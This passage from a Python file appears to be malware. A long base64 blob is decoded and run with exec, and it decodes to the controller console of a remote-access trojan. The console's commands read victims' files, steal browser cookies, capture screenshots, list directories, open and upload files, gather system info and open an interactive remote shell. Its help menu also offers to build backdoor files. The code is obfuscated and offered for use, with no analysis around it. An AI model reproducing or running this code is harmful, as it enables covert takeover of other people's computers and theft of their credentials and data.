NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25uLnNlbmQoYidyb3V0ZScpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ID0gY29ubi5yZWN2KDkwMjQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBQYWNrZXQgU3VjY2VzcyIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQob3V0cHV0LmRlY29kZSgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie3JlZH1bLV17cmVzZXR9IEZhaWxlZCBHZXQgUm91dGUiKQ0KDQogICAgICAgICAgICAgICAgICAgIGlmIHNoZWxsX2NvbW1hbmQgPT0gInJlYWQgZmlsZSI6DQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5zZW5kKGIicmVhZCBmaWxlIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRoID0gaW5wdXQoIkVudGVyIFZpY3RpbSBQYXRoIEZpbGUgOiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChwYXRoLmVuY29kZSgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IGNvbm4ucmVjdig5MDAyNCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IEZpbGUgOiAiLCBwYXRoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KG91dHB1dC5kZWNvZGUoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntyZWR9Wy1de3Jlc2V0fSBSZWFkIFBhdGggRmFpbGVkIikNCg0KICAgICAgICAgICAgICAgICAgICBpZiBzaGVsbF9jb21tYW5kID09ICJleGl0IjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChiJ2V4aXQnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5zZW5kKGZpbGVfbmFtZS5lbmNvZGUoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU2Vzc2lvbnMgQ2xvc2VkIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgc2hlbGxfY29tbWFuZCA9PSAicHdkIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25uLnNlbmQoYiJwd2QiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IGNvbm4ucmVjdigxMDAyNCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFBhY2tldCBTdWNjZXNzIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFBBVEggOiB7b3V0cHV0LmRlY29kZSgpfSIpDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVstXXtyZXNldH0gR2V0IFBhdGggRmFpbGVkIikNCg0KICAgICAgICAgICAgICAgICAgICBpZiBzaGVsbF9jb21tYW5kID09ICJnZXQgY29va2llIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbXBvcnQganNvbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChiImdldCBjb29raWUiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdlYiA9IGlucHV0KCJFbnRlciB3ZWJzaXRlIGZvciBnZXQgOiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gUGFja2V0IFN1Y2Nlc3MiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZCh3ZWIuZW5jb2RlKCkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlzdF9jb29rID0gY29ubi5yZWN2KDkwMjQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llID0ganNvbi5sb2FkcyhsaXN0X2Nvb2suZGVjb2RlKCkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiXG57Y29va2llfVxuIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKyIpDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVstXXtyZXNldH0gRmFpbGVkIEdldCBDb29raWUiKQ0KDQogICAgICAgICAgICAgICAgICAgIGlmIHNoZWxsX2NvbW1hbmQgPT0gIm9wZW4iOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChiIm9wZW4iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUgPSBpbnB1dCgiRW50ZXIgWW91ciBQYXRoIEZpbGUgT3BlbiAoIGV4IDogQzpcV2luZG93c1xoYWNrZWQudmJzICkgPj4gIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25uLnNlbmQoZmlsZS5lbmNvZGUoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFNlbmRpbmcgU3VjY2VzcyIpDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVstXXtyZXNldH0gT3BlbiBGYWlsZWQiKQ0KDQogICAgICAgICAgICAgICAgICAgIGlmIHNoZWxsX2NvbW1hbmQgPT0gInVwbG9hZCI6DQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aF9maWxlID0gaW5wdXQoIkVudGVyIFlvdXIgUGF0aCBGaWxlID4gIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZiJ7cGF0aF9maWxlfSIsICdyYicpIGFzIHJlYWRlcl9kb2M6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3MgPSByZWFkZXJfZG9jLnJlYWQoMTAwMDI0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFN0YXJ0IFVwbG9hZC4uLiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU2VuZGluZyBUbyBUYXJnZXQgU3VjY2VzcyIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gZmlsZSA6IHVwbG9hZF8xMjMuaHRtbCIpDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVstXXtyZXNldH0gRmFpbGVkIFVwbG9hZCIpDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgc2hlbGxfY29tbWFuZCA9PSAiZGlyIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25uLnNlbmQoYiJkaXIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNtZCA9IGlucHV0KCJFbnRlciBQYXRoIFZpY3RpbXMgKCBEZWZhdWx0IDogQzpcV2luZG93c1xTeXN0ZW0zMiApID4+PiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChjbWQuZW5jb2RlKCkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ID0gY29ubi5yZWN2KDkwMDAyNCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFNlbmRpbmcgU3VjY2VzcyIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJcbntvdXRwdXQuZGVjb2RlKCdsYXRpbi0xJyl9XG4iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie3JlZH1bLV17cmVzZXR9IEZhaWxlZCBTaG93IEZpbGUiKQ0KDQogICAgICAgICAgICAgICAgICAgIGlmIHNoZWxsX2NvbW1hbmQgPT0gInNjcmVlbnNob3QiOg0KICAgICAgICAgICAgICAgICAgICAgICAgaW1wb3J0IHJhbmRvbQ0KICAgICAgICAgICAgICAgICAgICAgICAgbiA9IHJhbmRvbS5yYW5kaW50KDEwMDAwMCwgOTk5OTk5KQ0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChiInNjcmVlbnNob3QiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbShmJ2VjaG8gIiIgPiB7YWRkclswXX1fe259LnBuZycpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKGYne2FkZHJbMF19X3tufS5wbmcnLCAnd2InKSBhcyBzYXZlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IENUUkwgKyBDIEV4aXQgU2NyZWVuc2hvdCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU3RhcnRpbmcgRmV0Y2hpbmcgSW1hZ2UuLi4iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW1hZ2VfZGF0YSA9IGNvbm4ucmVjdig5MDI0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGltYWdlX2RhdGE6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNhdmUud3JpdGUoaW1hZ2VfZGF0YSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFNlbmRpbmcgcGFja2V0IFRvIFZpY3RpbSIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTY3JlZW5zaG90IFN1Y2Nlc3MiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gSW1hZ2UgU2F2ZWQgVG8gOiB7YWRkclswXX1fe259LnBuZyIpDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTZW5kaW5nIHBhY2tldCBUbyBWaWN0aW0iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU2NyZWVuc2hvdCBTdWNjZXNzIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IEltYWdlIFNhdmVkIFRvIDoge2FkZHJbMF19X3tufS5wbmciKQ0KDQogICAgICAgICAgICAgICAgICAgIGlmIHNoZWxsX2NvbW1hbmQgPT0gInNoZWxsIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiU3RhcnRpbmcgQ29tbWFuZCBQcm9tcHQsIENNRCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2hlbGwgPSBpbnB1dCgic2hlbGwgPiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBzaGVsbCA9PSAiZXhpdCI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25uLnNlbmQoYiJleGl0IikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChzaGVsbC5lbmNvZGUoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ID0gY29ubi5yZWN2KDIwMjQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiXG57b3V0cHV0LmRlY29kZSgpfSIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCg0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie3JlZH1bLV17cmVzZXR9IFNoZWxsIEVycm9yIikNCg0KICAgICAgICAgICAgICAgICAgICBpZiBzaGVsbF9jb21tYW5kID09ICJtZXNzZW5nZSI6DQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5zZW5kKGIibWVzc2VuZ2UiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lc3MgPSBpbnB1dCgiRW50ZXIgTWVzc2VlZ2UgOiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChtZXNzLmVuY29kZSgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU3RhcnQgU2VuZGluZyBNZXNzZW5nZSAgOiB7bWVzc30iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gIERlZmF1bHQgT3BlbiBUYWIgOiAxMCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSAgU2VuZGluZyBNZXNzZW5nZXIgU3VjY2VzcyIpDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVstXXtyZXNldH0gU2hvdyBNZXNzZW5nZSBGYWlsZWQiKQ0KDQogICAgICAgICAgICAgICAgICAgIGlmIHNoZWxsX2NvbW1hbmQgPT0gInN5c2luZm8iOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChiInN5c2luZm8iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN5c3MgPSBjb25uLnJlY3YoOTAyNCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkID0gc3lzcy5kZWNvZGUoJ2xhdGluLTEnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gIFNlbmRpbmcgU3VjY2VzcyIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdW5hbWVzID0gZC5yZXBsYWNlKCd1bmFtZV9yZXN1bHQnLCAnJykucmVwbGFjZSgiKCIsICIiKS5yZXBsYWNlKCIpIiwgIiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdW5hbWUgPSB1bmFtZXMucmVwbGFjZSgiJyIsICIiKS5yZXBsYWNlKCIsIiwgIlxuIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhID0gdW5hbWUucmVwbGFjZSgnPScsICcgOiAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIrLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIlxue2F9XG4iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIrLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntyZWR9Wy1de3Jlc2V0fSBDbGllbnQgTm90IEFjY2VwdCwgRmFpbGVkIEdldCBTeXNJbmZvIikNCg0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIHByaW50KGYie3JlZH1bLV17cmVzZXR9IENvbm5lY3QgRnJvbSBDbGllbnQgSXMgRG93biIpDQoNCiAgICBpZiBjMl9pbnB1dCA9PSAiaGVscCIgb3IgYzJfaW5wdXQgPT0gImhlbHAgIjoNCiAgICAgICAgcHJpbnQoIiIiDQoNCkNvbW1hbmQgICAgICAgICBEZXNjcmlwdGlvbg0KLS0tLS0tLS0gICAgICAgLS0tLS0tLS0tLS0tLQ0KICAgYnVpbGQgICAgICAgICBCdWlsZCBGb3JtYXQgRmlsZSBCYWNrZG9vcg0KICAgZ2VuZXJhdG9yICAgICBidWlsZCBzaG9ydGN1dCBGb3JtYXQgRmlsZSBCYWNrZG9vcg0KICAgbGhvc3QgICAgICAgICBzZXQgbG9jYWwgaG9zdCBzZXJ2ZXINCiAgIGxwb3J0ICAgICAgICAgc2V0IGxvY2FsIHBvcnQgc2VydmVyDQogICByaG9zdCAgICAgICAgIHNldCByZW1vdGUgaG9zdCBjbGllbnQNCiAgIHJwb3J0ICAgICAgICAgc2V0IHJlbW90ZSBwb3J0IGNsaWVudA0KICAgb3B0aW9uICAgICAgICBzaG93IG9wdGlvbnMgc2V0dGluZ3MNCg0KZXhwbG9pdA0KLS0tLS0tLQ0KICAgZXhwbG9pdCAgICAgICBzdGFydCBleHBsb2l0DQogICBydW4gICAgICAgICAgIGV4cGxvaXQgc2hvcnRjdXQNCg0KU2VydmVyDQotLS0tLS0NCiAgIHNob3cgaW5ldCAgICAgU2hvdyBJbmV0DQoNCiIiIikNCiAgICBpZiBjMl9pbnB1dCA9PSAib3B0aW9uIiBvciBjMl9pbnB1dCA9PSAib3B0aW9uICIgb3IgYzJfaW5wdXQgPT0gIm9wdGlvbnMiOg0KICAgICAgICBwcmludChmIiIiDQpTZXJ2ZXIgICAgICAgICAgICBEZXNjcmlwdGlvbiAgICAgICAgICAgU2V0dGluZyBVcA0KLS0tLS0tICAgICAgICAgICAgLS0tLS0tLS0tLS0tICAgICAgICAgIC0tLS0tLS0tLS0tDQogTEhPU1QgICAgICAgICAgICAgTG9jYWwgU2VydmVyIEhvc3QgICAgIHtsaG9zdH0NCiBMUE9SVCAgICAgICAgICAgICBMb2NhbCBTZXJ2ZXIgUG9ydCAgICAge2xwb3J0fQ0KDQpDbGllbnQgICAgICAgICAgICBEZXNjcmlwdGlvbiAgICAgICAgICAgU2V0dGluZyBVcA0KLS0tLS0tICAgICAgICAgICAgLS0tLS0tLS0tLS0tICAgICAgICAgIC0tLS0tLS0tLS0tDQogUkhPU1QgICAgICAgICAgICAgUmVtb3RlIENsaWVudCBIb3N0ICAgIHtyaG9zdH0NCiBSUE9SVCAgICAgICAgICAgICBSZW1vdGUgQ2xpZW50IFBvcnQgICAge3Jwb3J0fQ0KDQpGb3JtYXQgICAgICAgICAgICBEZXNjcmlwdGlvbiAgICAgICAgICAgU2V0dGluZyBVcA0KLS0tLS0tICAgICAgICAgICAgLS0tLS0tLS0tLS0tICAgICAgICAgIC0tLS0tLS0tLS0tDQogRklMRV9OQU1FICAgICAgICAgRm9ybWF0IEZpbGUgTmFtZSAgICAgIHtmaWxlX25hbWV9LnB5DQoiIiIpDQogICAgaWYgYzJfaW5wdXQgPT0gInNob3cgaW5ldCI6DQogICAgICAgIG9zLnN5c3RlbSgnaXBjb25maWcnIGlmIG9zLm5hbWUgPT0gJ250JyBlbHNlICdpZmNvbmZpZyB8IGdyZXAgImluZXQiJykNCiAgICBpZiBjMl9pbnB1dCA9PSAiZXhpdCI6DQogICAgICAgIHByaW50KGYie3JlZH1bLV17cmVzZXR9IFRoYW5rcyBGb3IgVXNpbmcgVG9vbCIpDQogICAgICAgIGV4aXQoZiJ7cmVkfVstXXtyZXNldH0gRXhpdCBCeSBVc2VyIikNCiAgICBlbHNlOg0KICAgICAgICBwYXNz"
start = base64.b64decode(script)
exec(start)
